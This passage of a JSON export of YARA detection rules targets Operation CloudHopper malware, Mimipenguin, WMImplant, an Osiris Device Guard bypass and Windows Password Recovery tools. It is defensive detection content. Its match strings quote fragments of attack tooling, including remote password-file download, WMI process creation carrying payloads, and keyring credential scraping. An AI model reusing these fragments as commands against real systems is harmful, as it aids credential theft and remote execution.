samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_2_RID2FEE","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"79f6ff8f9b71f6233940482c6ee63e44","score":75,"tags":["DEMO","T1085","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_3_RID2FEF : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"operator \\\"\\\" \" fullword ascii\n      $s7 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n      $s11 = \"InvokeMainViaCRT\" fullword ascii\n      $s12 = \".?AVAES@@\" fullword ascii\n      $op1 = { b6 4c 06 f5 32 cf 88 4c 06 05 0f b6 4c 06 f9 32 } \n      $op2 = { 06 fc eb 03 8a 5e f0 85 c0 74 05 8a 0c 06 eb 03 } \n      $op3 = { 7e f8 85 c0 74 06 8a 74 06 08 eb 03 8a 76 fc 85 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( all of ( $s* ) and 1 of ( $op* ) ) or all of ( $op* ) ) or ( 5 of them )\n}","date":"2017-04-03 12:18:21","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_3_RID2FEF","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"64351c6dd480246e11350e2830d19786","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Dropper_1_RID3000 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{\\\\version2}{\\\\edmins0}{\\\\nofpages1}{\\\\nofwords11}{\\\\nofchars69}{\\\\*\\\\company google}{\\\\nofcharsws79}{\\\\vern24611}{\\\\*\\\\password\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5c7b and filesize < 700KB and all of them )\n}","date":"2017-04-03 12:21:11","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Dropper_1_RID3000","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"66cbf1ca6034281bd4a2d41cfad77e6e","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_4_RID2FF0 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"operator \\\"\\\" \" fullword ascii\n      $s9 = \"InvokeMainViaCRT\" fullword ascii\n      $s10 = \".?AVAES@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them )\n}","date":"2017-04-03 12:18:31","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_4_RID2FF0","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"97d09c2ed24f2fb653d89024e236025e","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_5_RID2FF1 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CWINDOWSSYSTEMROOT\" fullword ascii\n      $x2 = \"YJ_D_KROPOX_M_NUJI_OLY_S_JU_MOOK\" fullword ascii\n      $x3 = \"NJK_JK_SED_PNJHGFUUGIOO_PIY\" fullword ascii\n      $x4 = \"c_VDGQBUl}YSB_C_VDlqSDYFU\" fullword ascii\n      $s7 = \"FALLINLOVE\" fullword ascii\n      $op1 = { 83 ec 60 8d 4c 24 00 e8 6f ff ff ff 8d 4c 24 00 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 4 of them )\n}","date":"2017-04-03 12:18:41","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_5_RID2FF1","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"815087a5f3a5afe8fbbfddeb6cf74518","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_6_RID2FF2 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"YDNCCOVZKXGRVQPOBRNXXQVNQYXBBCONCOQEGYELIRBEYOVODGXCOXTHXPCXNGUCHRVWKKZSYQMAOWWGHRSPRGSEUWYMEFZHRTHO\" fullword ascii\n      $s2 = \"psychiatry.dat\" fullword ascii\n      $s3 = \"meekness.lnk\" fullword ascii\n      $s4 = \"SOFTWARE\\\\EGGORG\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-04-03 12:18:51","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_6_RID2FF2","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"e789ada4588167076c0e469cc060848a","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_7_RID2FF3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"jepsjepsjepsjepsjepsjepsjepsjepsjepsjeps\" fullword ascii\n      $x2 = \"extOextOextOextO\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-03 12:19:01","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_7_RID2FF3","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"678f3f18f923ed6b3f5b95dbd7de3dbe","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_8_RID2FF4 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WSHELL32.dll\" fullword wide\n      $s2 = \"operator \\\"\\\" \" fullword ascii\n      $s3 = \"\\\" /t REG_SZ /d \\\"\" fullword wide\n      $s4 = \" /f /v \\\"\" fullword wide\n      $s5 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n      $s6 = \"AFX_DIALOG_LAYOUT\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 4 of them )\n}","date":"2017-04-03 12:19:11","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_8_RID2FF4","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"a16665107e7c555f4d75a918f5d1ab9d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_9_RID2FF5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"MsMpEng.exe\" fullword ascii\n      $op0 = { 2b c7 50 e8 22 83 ff ff ff b6 c0 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-03 12:19:21","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_9_RID2FF5","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"6ed723e16c1600f41c8d676d212b0f95","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_10_RID301D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:26:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"bakshell.EXE\" fullword wide\n      $s19 = \"bakshell Applicazione MFC\" fullword wide\n      $op0 = { 83 c4 34 c3 57 8b ce e8 92 18 00 00 68 20 70 40 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-04-03 12:26:01","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_10_RID301D","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"f3e97e4cfea6022bf6bc04baf92e2c37","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule OpCloudHopper_Malware_11_RID301E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Operation CloudHopper malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html\"\n      date = \"2017-04-03 12:26:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"IOGVWDWCXZVRHTE\" fullword ascii\n      $op1 = { c9 c3 56 6a 00 8b f1 6a 64 e8 dd 34 00 00 c7 06 } \n      $op2 = { 68 38 00 41 00 68 34 00 41 00 e8 d3 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-04-03 12:26:11","description":"Detects Operation CloudHopper malware samples","minimum_yara":"1.7","name":"OpCloudHopper_Malware_11_RID301E","reference":"https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html","required_modules":[],"rule_hash":"3aacef22ab991eeabe19f7e942693555","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Mimipenguin_SH_RID2C8D : DEMO HKTL LINUX T1003 {\n   meta:\n      description = \"Detects Mimipenguin Password Extractor - Linux\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/huntergregal/mimipenguin\"\n      date = \"2017-04-01 09:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, LINUX, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$(echo $thishash | cut -d'$' -f 3)\" ascii\n      $s2 = \"ps -eo pid,command | sed -rn '/gnome\\\\-keyring\\\\-daemon/p' | awk\" ascii\n      $s3 = \"MimiPenguin Results:\" ascii\n   condition: \n      1 of them\n}","date":"2017-04-01 09:54:01","description":"Detects Mimipenguin Password Extractor - Linux","minimum_yara":"1.7","name":"Mimipenguin_SH_RID2C8D","reference":"https://github.com/huntergregal/mimipenguin","required_modules":[],"rule_hash":"785b65fe34483abb839b943a6beac08f","score":75,"tags":["DEMO","LINUX","T1003","HKTL"]},{"author":"Florian Roth","content":"rule Invoke_OSiRis_RID2C15 : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Osiris Device Guard Bypass - file Invoke-OSiRis.ps1\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-27 09:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$null = Iwmi Win32_Process -EnableA -Impers 3 -AuthenPacketprivacy -Name Create -Arg $ObfusK -Computer $Target\" fullword ascii\n      $x2 = \"Invoke-OSiRis\" ascii\n      $x3 = \"-Arg@{Name=$VarName;VariableValue=$OSiRis;UserName=$env:Username}\" fullword ascii\n      $x4 = \"Device Guard Bypass Command Execution\" fullword ascii\n      $x5 = \"-Put Payload in Win32_OSRecoveryConfiguration DebugFilePath\" fullword ascii\n      $x6 = \"$null = Iwmi Win32_Process -EnableA -Impers 3 -AuthenPacketprivacy -Name Create\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-03-27 09:34:01","description":"Osiris Device Guard Bypass - file Invoke-OSiRis.ps1","minimum_yara":"1.7","name":"Invoke_OSiRis_RID2C15","reference":"Internal Research","required_modules":[],"rule_hash":"9a8436277af07f6ad501e8784ccedfe8","score":75,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Malware_JS_powershell_obfuscated_RID33F9 : DEMO MAL OBFUS T1027 T1086 {\n   meta:\n      description = \"Unspecified malware - file rechnung_3.js\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-24 15:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, OBFUS, T1027, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"po\\\" + \\\"wer\\\" + \\\"sh\\\" + \\\"e\\\" + \\\"ll\\\";\" fullword ascii\n   condition: \n      filesize < 30KB and 1 of them\n}","date":"2017-03-24 15:10:41","description":"Unspecified malware - file rechnung_3.js","minimum_yara":"1.7","name":"Malware_JS_powershell_obfuscated_RID33F9","reference":"Internal Research","required_modules":[],"rule_hash":"d05457605a9bbca34711f5ef85f5858c","score":75,"tags":["DEMO","T1086","T1027","OBFUS","MAL"]},{"author":"Florian Roth","content":"rule WMImplant_RID2A8A : DEMO SCRIPT T1047 T1064 {\n   meta:\n      description = \"Detects WMI implant- file WMImplant_RID2A8A.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html\"\n      date = \"2017-03-24 06:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1047, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-ProcessPunisher -Creds $RemoteCredential\" fullword ascii\n      $x2 = \"$Target -query \\\"SELECT * FROM Win32_NTLogEvent WHERE (logfile='security')\" ascii\n      $x3 = \"WMImplant_RID2A8A -Creds\" fullword ascii\n      $x4 = \"-Download -RemoteFile C:\\\\passwords.txt\" ascii\n      $x5 = \"-Command 'powershell.exe -command \\\"Enable-PSRemoting\" fullword ascii\n      $x6 = \"Invoke-WMImplant_RID2A8A\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-03-24 06:41:41","description":"Detects WMI implant- file WMImplant.ps1","minimum_yara":"1.7","name":"WMImplant_RID2A8A","reference":"https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html","required_modules":[],"rule_hash":"adc75bc617b696d5841da9e5defa27a6","score":75,"tags":["DEMO","T1064","SCRIPT","T1047"]},{"author":"Florian Roth","content":"rule BeyondExec_RemoteAccess_Tool_RID3211 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects BeyondExec Remote Access Tool - file rexesvr.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/BvYurS\"\n      date = \"2017-03-17 13:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\BeyondExecV2\\\\Server\\\\Release\\\\Pipes.pdb\" ascii\n      $x2 = \"\\\\\\\\.\\\\pipe\\\\beyondexec%d-stdin\" fullword ascii\n      $x3 = \"Failed to create dispatch pipe. Do you have another instance running?\" fullword ascii\n      $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 } \n      $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or all of ( $op* ) ) ) or ( 3 of them )\n}","date":"2017-03-17 13:49:21","description":"Detects BeyondExec Remote Access Tool - file rexesvr.exe","minimum_yara":"1.7","name":"BeyondExec_RemoteAccess_Tool_RID3211","reference":"https://goo.gl/BvYurS","required_modules":[],"rule_hash":"b145fc4bff367d228070fec8fa8bd768","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WPR_loader_EXE_RID2C21 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file loader.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 09:36:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Failed to get system process ID\" fullword wide\n      $s2 = \"gLSASS.EXE\" fullword wide\n      $s3 = \"WriteProcessMemory failed\" fullword wide\n      $s4 = \"wow64 process NOT created\" fullword wide\n      $s5 = \"\\\\ast.exe\" fullword wide\n      $s6 = \"Exit code=%s, status=%d\" fullword wide\n      $s7 = \"VirtualProtect failed\" fullword wide\n      $s8 = \"nSeDebugPrivilege\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them )\n}","date":"2017-03-15 09:36:01","description":"Windows Password Recovery - file loader.exe","minimum_yara":"1.7","name":"WPR_loader_EXE_RID2C21","reference":"Internal Research","required_modules":[],"rule_hash":"884f9f84d792713bb0e20f176475a18f","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WPR_loader_DLL_RID2C1B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file loader64.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 09:35:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"loader64.dll\" fullword ascii\n      $x2 = \"loader.dll\" fullword ascii\n      $s1 = \"TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==\" fullword ascii\n      $s2 = \"UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50\" fullword ascii\n      $s3 = \"U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz\" fullword ascii\n      $s4 = \"VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk\" fullword ascii\n      $s5 = \"TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=\" fullword ascii\n      $s6 = \"YXNwbmV0X1dQX1BBU1NXT1JE\" fullword ascii\n      $s7 = \"TCRBTk1fQ1JFREVOVElBTFM=\" fullword ascii\n      $s8 = \"RGVmYXVsdFBhc3N3b3Jk\" fullword ascii\n      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } \n      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } \n      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or ( 1 of ( $s* ) and all of ( $op* ) ) )\n}","date":"2017-03-15 09:35:01","description":"Windows Password Recovery - file loader64.dll","minimum_yara":"1.7","name":"WPR_loader_DLL_RID2C1B","reference":"Internal Research","required_modules":[],"rule_hash":"869c6eb3c630c7fe5b50d41af80dfbb2","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WPR_Passscape_Loader_RID2EC2 : DEMO EXE FILE HKTL T1050 {\n   meta:\n      description = \"Windows Password Recovery - file ast.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 11:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\PasscapeLoader64\" fullword wide\n      $s2 = \"ast64.dll\" fullword ascii\n      $s3 = \"\\\\loader64.exe\" fullword wide\n      $s4 = \"Passcape 64-bit Loader Service\" fullword wide\n      $s5 = \"PasscapeLoader64\" fullword wide\n      $s6 = \"ast64 {msg1GkjN7Sh8sg2Al7ker63f}\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-03-15 11:28:11","description":"Windows Password Recovery - file ast.exe","minimum_yara":"1.7","name":"WPR_Passscape_Loader_RID2EC2","reference":"Internal Research","required_modules":[],"rule_hash":"837c3f402e649d6c5b0f509d796ace7b","score":75,"tags":["DEMO","EXE","T1050","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WPR_Asterisk_Hook_Library_RID30D3 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file ast64.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 12:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ast64.dll\" fullword ascii\n      $s2 = \"ast.dll\" fullword wide\n      $s3 = \"c:\\\\%s.lvc\" fullword ascii\n      $s4 = \"c:\\\\%d.lvc\" fullword ascii\n      $s5 = \"Asterisk Hook Library\" fullword wide\n      $s6 = \"?Ast_StartRd64@@YAXXZ\" fullword ascii\n      $s7 = \"Global\\\\{1374821A-281B-9AF4-%04X-12345678901234}\" fullword ascii\n      $s8 = \"2004-2013 Passcape Software\" fullword wide\n      $s9 = \"Global\\\\Passcape#6712%04X\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them )\n}","date":"2017-03-15 12:56:21","description":"Windows Password Recovery - file ast64.dll","minimum_yara":"1.7","name":"WPR_Asterisk_Hook_Library_RID30D3","reference":"Internal Research","required_modules":[],"rule_hash":"bde1934575725ec07bc9c4255e7fab50","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WPR_WindowsPasswordRecovery_EXE_RID3337 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file wpr.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 14:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"UuPipe\" fullword ascii\n      $x2 = \"dbadllgl\" fullword ascii\n      $x3 = \"UkVHSVNUUlkgTU9O\" fullword ascii\n      $x4 = \"RklMRSBNT05JVE9SIC0gU1l\" fullword ascii\n      $s1 = \"WPR.exe\" fullword wide\n      $s2 = \"Windows Password Recovery\" fullword wide\n      $op0 = { 5f df 27 17 89 } \n      $op1 = { 5f 00 00 f2 e5 cb 97 } \n      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20000KB and ( 1 of ( $x* ) or all of ( $s* ) or all of ( $op* ) )\n}","date":"2017-03-15 14:38:21","description":"Windows Password Recovery - file wpr.exe","minimum_yara":"1.7","name":"WPR_WindowsPasswordRecovery_EXE_RID3337","reference":"Internal Research","required_modules":[],"rule_hash":"2d158b363dc0e46bbd3759876da9c507","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WPR_WindowsPasswordRecovery_EXE_64_RID3400 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Windows Password Recovery - file ast64.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-03-15 15:11:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%B %d %Y  -  %H:%M:%S\" fullword wide\n      $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 } \n      $op1 = { ff 15 16 25 01 00 f7 d8 1b } \n      $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-03-15 15:11:51","description":"Windows Password Recovery - file ast64.exe","minimum_yara":"1.7","name":"WPR_WindowsPasswordRecovery_EXE_64_RID3400","reference":"Internal Research","required_modules":[],"rule_hash":"f52f483c554297b636d73fff985e9243","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PowerShell_Susp_Parameter_Combo_RID336F : ANOMALY DEMO SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects PowerShell invocation with suspicious parameters\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/uAic1X\"\n      date = \"2017-03-12 14:47:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"file\"\n      tags = \"ANOMALY, DEMO, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \" -enc \" ascii nocase\n      $sa2 = \" -EncodedCommand \" ascii nocase\n      $sb1 = \" -w 